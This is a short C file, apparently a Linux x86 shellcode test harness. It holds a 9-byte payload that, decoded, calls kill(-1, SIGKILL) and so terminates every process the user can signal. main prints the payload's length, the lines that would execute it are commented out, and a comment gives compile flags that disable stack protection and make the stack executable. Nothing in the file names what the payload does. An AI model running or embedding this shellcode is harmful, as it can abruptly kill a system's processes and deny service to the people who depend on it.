#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\xb0\x25\x6a\xff\x5b\xb1\x09\xcd\x80";

int main(){
	printf("Shellcode Length:  %d\n", strlen(code));
//	int (*ret)() = (int(*)())code;
//	ret();
}

//Compilation : gcc shellcode.c -o shellcode -fno-stack-protector -z execstack
